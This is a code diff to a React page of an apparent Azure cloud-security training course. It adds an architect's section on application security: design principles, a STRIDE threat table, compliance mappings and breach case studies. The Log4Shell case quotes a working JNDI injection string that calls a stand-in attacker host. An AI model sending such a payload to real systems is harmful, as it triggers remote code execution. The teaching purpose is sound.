@@ -3,6 +3,7 @@ import { Link } from "react-router-dom";
 import { ChevronLeft, ChevronRight } from "lucide-react";
 import AutoMarkOverview from "../../../components/AutoMarkOverview";
 import PhaseStepItem from "../../../components/PhaseStepItem";
+import ArchitectNote from "../../../components/ArchitectNote";
 
 const TOTAL = 7;
 const OBJECTIVES = [
@@ -15,7 +16,7 @@ const OBJECTIVES = [
 ];
 
 const Day4 = () => {
-  const [open, setOpen] = useState(() => new Set([0,1,2,3,4,5,6]));
+  const [open, setOpen] = useState(() => new Set([0,1,2,3,4,5,6,7]));
   const [checked, setChecked] = useState(new Set());
   const toggleOpen = (i) => setOpen(p => { const s = new Set(p); s.has(i) ? s.delete(i) : s.add(i); return s; });
   const toggleChecked = (i) => setChecked(p => { const s = new Set(p); s.has(i) ? s.delete(i) : s.add(i); return s; });
@@ -56,7 +57,7 @@ const Day4 = () => {
           </ul>
         </div>
         <div className="flex items-center justify-end gap-4 text-xs text-gray-600 mb-3">
-          <button onClick={() => setOpen(new Set([0,1,2,3,4,5,6]))} className="hover:text-gray-400 transition-colors">expand all</button>
+          <button onClick={() => setOpen(new Set([0,1,2,3,4,5,6,7]))} className="hover:text-gray-400 transition-colors">expand all</button>
           <span>|</span>
           <button onClick={() => setOpen(new Set())} className="hover:text-gray-400 transition-colors">collapse all</button>
         </div>
@@ -220,6 +221,101 @@ const Day4 = () => {
               <li className="flex items-start gap-2"><span className="text-red-400 flex-shrink-0">$</span><span>Harden the App Service with HTTPS, TLS 1.2, and access restrictions</span></li>
             </ul>
             <div className="mt-3"><Link to="/module4/task" className="text-red-400 hover:text-red-300 transition-colors">→ ./start_lab.sh</Link></div>
+          </PhaseStepItem>
+
+          <PhaseStepItem number={8} type="ARCHITECT" title="Cloud Architect's Perspective — Application Security"
+            isOpen={open.has(7)} onToggleOpen={() => toggleOpen(7)}
+            isChecked={checked.has(7)} onToggleChecked={() => toggleChecked(7)}>
+
+            <ArchitectNote title="Core Design Principles">
+              <ul className="space-y-1.5">
+                <li className="flex items-start gap-2"><span className="text-indigo-400 flex-shrink-0">▸</span><span><span className="text-gray-200">Secrets never belong in code, config files, or environment variables.</span> They belong in Key Vault — always. An environment variable is visible in process listings, deployment logs, and any diagnostic output. Key Vault references in App Service settings are the correct pattern.</span></li>
+                <li className="flex items-start gap-2"><span className="text-indigo-400 flex-shrink-0">▸</span><span><span className="text-gray-200">Managed Identities eliminate the credential attack surface for app-to-service auth.</span> If an application uses a managed identity to access SQL, Key Vault, and Storage, there are zero credentials to steal, rotate, or accidentally expose. This is the highest-impact security design decision in app architecture.</span></li>
+                <li className="flex items-start gap-2"><span className="text-indigo-400 flex-shrink-0">▸</span><span><span className="text-gray-200">API Management is your security enforcement layer.</span> Authentication, authorisation, rate limiting, input schema validation, and threat detection should live at the API gateway — not scattered across individual microservices. Centralise these controls.</span></li>
+                <li className="flex items-start gap-2"><span className="text-indigo-400 flex-shrink-0">▸</span><span><span className="text-gray-200">Shift-left means pre-commit, not pre-deploy.</span> Secret scanning in a CI pipeline catches secrets after they've already been committed and potentially synced to remote. Pre-commit hooks (git-secrets, gitleaks, trufflehog) catch secrets before they ever leave the developer's machine.</span></li>
+                <li className="flex items-start gap-2"><span className="text-indigo-400 flex-shrink-0">▸</span><span><span className="text-gray-200">Validate all inputs at the application boundary, not inside it.</span> SQL injection, SSRF, path traversal, and XXE all succeed because applications trust data they receive. Validate type, length, format, and range at every entry point. Parameterise all database queries — no exceptions.</span></li>
+              </ul>
+            </ArchitectNote>
+
+            <ArchitectNote title="STRIDE Threat Model — Application Layer">
+              <div className="overflow-x-auto">
+                <table className="w-full text-xs font-mono border-collapse">
+                  <thead>
+                    <tr className="border-b border-indigo-800/50">
+                      <th className="text-left text-indigo-300 py-1 pr-4 font-semibold">Threat</th>
+                      <th className="text-left text-indigo-300 py-1 pr-4 font-semibold">Attack Vector</th>
+                      <th className="text-left text-indigo-300 py-1 font-semibold">Mitigation</th>
+                    </tr>
+                  </thead>
+                  <tbody className="text-gray-400">
+                    <tr className="border-b border-gray-700/30">
+                      <td className="py-1.5 pr-4 text-yellow-400 font-bold">Spoofing</td>
+                      <td className="py-1.5 pr-4">API key / JWT token theft, OAuth token relay attack</td>
+                      <td className="py-1.5">Short token lifetimes, PKCE for OAuth, token binding, API Management validation</td>
+                    </tr>
+                    <tr className="border-b border-gray-700/30">
+                      <td className="py-1.5 pr-4 text-orange-400 font-bold">Tampering</td>
+                      <td className="py-1.5 pr-4">SQL/NoSQL injection, SSRF to internal services, path traversal</td>
+                      <td className="py-1.5">Parameterised queries, input validation, SSRF protection (block 169.254.x.x range)</td>
+                    </tr>
+                    <tr className="border-b border-gray-700/30">
+                      <td className="py-1.5 pr-4 text-blue-400 font-bold">Info Disclosure</td>
+                      <td className="py-1.5 pr-4">Secrets in application logs, stack traces in HTTP 500 responses, GitHub leaks</td>
+                      <td className="py-1.5">Structured logging (never log secrets), generic error responses, secret scanning in CI</td>
+                    </tr>
+                    <tr className="border-b border-gray-700/30">
+                      <td className="py-1.5 pr-4 text-red-400 font-bold">Elev. of Privilege</td>
+                      <td className="py-1.5 pr-4">JWT alg:none bypass, IDOR (Insecure Direct Object Reference), broken authorisation</td>
+                      <td className="py-1.5">Validate JWT alg explicitly, server-side authorisation checks on every object access</td>
+                    </tr>
+                    <tr>
+                      <td className="py-1.5 pr-4 text-red-400 font-bold">Denial of Service</td>
+                      <td className="py-1.5 pr-4">Unbounded API calls, regex DoS (ReDoS), large payload attacks</td>
+                      <td className="py-1.5">API Management rate limits, request size limits, timeout enforcement at App Service</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </ArchitectNote>
+
+            <ArchitectNote title="Compliance Mapping">
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
+                <div className="p-2 border border-indigo-800/40 bg-indigo-900/20">
+                  <p className="text-indigo-300 font-semibold mb-1">CIS Azure Benchmark v2.0</p>
+                  <p className="text-gray-400">Section 9 — AppService (Controls 9.1–9.13). HTTPS-only, TLS minimum version, remote debugging disabled, client certificates, authentication enabled.</p>
+                </div>
+                <div className="p-2 border border-indigo-800/40 bg-indigo-900/20">
+                  <p className="text-indigo-300 font-semibold mb-1">NIST SP 800-218 (SSDF v1.1)</p>
+                  <p className="text-gray-400">Secure Software Development Framework. PW.1 (design for security), PW.4 (reuse secure components), PO.3 (implement toolchain security). The shift-left philosophy codified.</p>
+                </div>
+                <div className="p-2 border border-indigo-800/40 bg-indigo-900/20">
+                  <p className="text-indigo-300 font-semibold mb-1">OWASP ASVS 4.0</p>
+                  <p className="text-gray-400">Application Security Verification Standard. Level 2 (standard applications) covers authentication, session management, access control, input validation, cryptography, and API security controls.</p>
+                </div>
+                <div className="p-2 border border-indigo-800/40 bg-indigo-900/20">
+                  <p className="text-indigo-300 font-semibold mb-1">CSA CCM v4 — AIS Domain</p>
+                  <p className="text-gray-400">Application &amp; Interface Security (AIS-01 through AIS-06). Covers application security testing, secure design, vulnerability management, and software integrity protection.</p>
+                </div>
+              </div>
+            </ArchitectNote>
+
+            <ArchitectNote title="Real-World Incidents — What Happens When This Fails">
+              <div className="space-y-3">
+                <div className="p-3 border border-gray-700/50 bg-gray-800/40">
+                  <p className="text-red-400 text-xs font-bold mb-1">Uber — 57 Million Records (2016)</p>
+                  <p className="text-gray-400 text-xs">Two attackers discovered Uber engineer AWS access keys hardcoded in a private GitHub repository. Using those keys, they accessed an S3 bucket containing a backup file with 57 million rider and driver records. Uber paid a $100,000 ransom and concealed the breach for over a year. <span className="text-gray-300">Lesson: managed identities eliminate the class of vulnerability entirely. If the app had used IAM roles instead of access keys, there would have been nothing to steal from the repo.</span></p>
+                </div>
+                <div className="p-3 border border-gray-700/50 bg-gray-800/40">
+                  <p className="text-red-400 text-xs font-bold mb-1">Apache Log4Shell — CVE-2021-44228</p>
+                  <p className="text-gray-400 text-xs">A JNDI injection vulnerability in Apache Log4j allowed attackers to trigger remote code execution by sending a crafted string in any logged field (e.g., User-Agent header: <code className="text-yellow-400">${'{'}jndi:ldap://attacker.com/exploit{'}'}</code>). Affected millions of Java applications globally. <span className="text-gray-300">Lesson: dependency scanning (SCA) with SBOMs and automated CVE alerting is mandatory. Software Composition Analysis catches this class of vulnerability at build time, not after deployment.</span></p>
+                </div>
+                <div className="p-3 border border-gray-700/50 bg-gray-800/40">
+                  <p className="text-red-400 text-xs font-bold mb-1">Samsung Internal Source Code Leak via GitLab (2023)</p>
+                  <p className="text-gray-400 text-xs">Samsung's internal GitLab instance was exposed publicly. Repositories contained hardcoded credentials, API keys for internal services, and proprietary source code including Galaxy device software. <span className="text-gray-300">Lesson: secret scanning must be enforced server-side (push rules, not just client-side hooks). Access to code repositories must require authentication with MFA — code repos are crown jewels.</span></p>
+                </div>
+              </div>
+            </ArchitectNote>
+
           </PhaseStepItem>
         </div>
         <div className="flex justify-between items-center text-sm border-t border-gray-700 pt-6">
